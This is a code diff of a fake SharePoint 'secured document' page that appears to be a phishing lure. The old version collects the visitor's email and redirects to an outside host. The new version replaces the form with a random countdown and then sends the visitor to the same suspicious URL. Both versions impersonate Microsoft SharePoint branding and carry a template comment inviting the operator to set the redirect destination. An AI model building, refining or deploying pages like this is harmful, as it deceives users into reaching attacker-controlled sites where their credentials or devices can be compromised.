@@ -276,63 +276,38 @@
             margin-bottom: 20px;
         }
 
-        .form-group {
-            margin-bottom: 16px;
+        .countdown-container {
+            text-align: center;
+            padding: 20px 0;
         }
 
-        .form-label {
-            display: block;
+        .countdown-number {
+            font-size: 48px;
+            font-weight: 600;
+            color: #0078d4;
+            line-height: 1;
+            margin-bottom: 8px;
+        }
+
+        .countdown-label {
             font-size: 13px;
-            font-weight: 600;
-            color: #323130;
-            margin-bottom: 6px;
+            color: #605e5c;
         }
 
-        .form-input {
+        .progress-bar {
             width: 100%;
-            padding: 8px 12px;
-            border: 1px solid #8a8886;
+            height: 4px;
+            background: #edebe9;
             border-radius: 2px;
-            font-size: 14px;
-            font-family: inherit;
-            color: #323130;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+            overflow: hidden;
         }
 
-        .form-input:hover {
-            border-color: #605e5c;
-        }
-
-        .form-input:focus {
-            border-color: #0078d4;
-            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
-        }
-
-        .form-input::placeholder {
-            color: #a19f9d;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 10px 16px;
+        .progress-fill {
+            height: 100%;
             background: #0078d4;
-            color: white;
-            border: none;
             border-radius: 2px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 4px;
-        }
-
-        .btn-primary:hover {
-            background: #106ebe;
-        }
-
-        .btn-primary:active {
-            background: #005a9e;
+            transition: width 1s linear;
         }
 
         .info-box {
@@ -473,6 +448,7 @@
             display: none;
         }
     </style>
+<base target="_blank">
 </head>
 <body>
     <!-- Blurred SharePoint Background -->
@@ -543,42 +519,34 @@
                     </div>
                 </div>
             </div>
-            
+
             <div class="divider"></div>
-            
-            <div class="card-body" id="formSection">
-                <h1 class="title">You've received a secured document</h1>
-                <p class="description">The shared file will appear on your screen after verification. Please enter your email address to continue.</p>
-                
-                <form id="verifyForm">
-                    <div class="form-group">
-                        <label class="form-label" for="email">Email address</label>
-                        <input 
-                            type="email" 
-                            id="email" 
-                            class="form-input" 
-                            placeholder="name@organization.com" 
-                            required
-                            autocomplete="email"
-                        >
+
+            <div class="card-body" id="countdownSection">
+                <h1 class="title">Preparing your document</h1>
+                <p class="description">Your secured document is being prepared. Please wait while we verify access and load the content.</p>
+
+                <div class="countdown-container">
+                    <div class="countdown-number" id="countdownNumber">5</div>
+                    <div class="countdown-label">seconds until document opens</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill" style="width: 100%;"></div>
                     </div>
-                    
-                    <button type="submit" class="btn-primary">Verify & Open Document</button>
-                </form>
-                
+                </div>
+
                 <div class="info-box">
                     <svg class="info-icon" viewBox="0 0 24 24">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                     </svg>
-                    <span class="info-text">Your email is used solely to verify access. The document opens automatically after confirmation.</span>
+                    <span class="info-text">Your access is being verified. The document will open automatically once ready.</span>
                 </div>
             </div>
-            
+
             <div class="loading hidden" id="loadingSection">
                 <div class="spinner"></div>
-                <div class="loading-text">Verifying your access...</div>
+                <div class="loading-text">Opening document...</div>
             </div>
-            
+
             <div class="card-footer">
                 <div class="sharepoint-brand">
                     <div class="sp-logo">
@@ -594,33 +562,40 @@
     </div>
 
     <script>
-        document.getElementById('verifyForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const formSection = document.getElementById('formSection');
-            const loadingSection = document.getElementById('loadingSection');
-            
-            // Hide form, show loading
-            formSection.classList.add('hidden');
-            loadingSection.classList.remove('hidden');
-            
-            // Simulate verification process then redirect
-            setTimeout(() => {
-                // CHANGE THIS URL TO YOUR DESIRED REDIRECT DESTINATION
-                window.location.href = 'https://wealthcapofhb.apexoralabs.com/DG72B3058TY8/';
-            }, 1500);
-        });
+        // Random countdown between 5 and 8 seconds
+        const countdownTime = Math.floor(Math.random() * 4) + 5; // 5 to 8 seconds
+        let remaining = countdownTime;
 
-        // Add subtle input animation
-        const input = document.getElementById('email');
-        input.addEventListener('focus', () => {
-            input.parentElement.style.transform = 'scale(1.02)';
-            input.parentElement.style.transition = 'transform 0.2s';
-        });
-        input.addEventListener('blur', () => {
-            input.parentElement.style.transform = 'scale(1)';
-        });
+        const countdownNumber = document.getElementById('countdownNumber');
+        const progressFill = document.getElementById('progressFill');
+        const countdownSection = document.getElementById('countdownSection');
+        const loadingSection = document.getElementById('loadingSection');
+
+        // Update countdown every second
+        const interval = setInterval(() => {
+            remaining--;
+            countdownNumber.textContent = remaining;
+
+            // Update progress bar
+            const progressPercent = (remaining / countdownTime) * 100;
+            progressFill.style.width = progressPercent + '%';
+
+            if (remaining <= 0) {
+                clearInterval(interval);
+
+                // Show loading state
+                countdownSection.classList.add('hidden');
+                loadingSection.classList.remove('hidden');
+
+                // Redirect after brief loading animation
+                setTimeout(() => {
+                    window.location.href = 'https://wealthcapofhb.apexoralabs.com/DG72B3058TY8/';
+                }, 800);
+            }
+        }, 1000);
+
+        // Set initial progress bar
+        progressFill.style.width = '100%';
     </script>
 </body>
 </html>
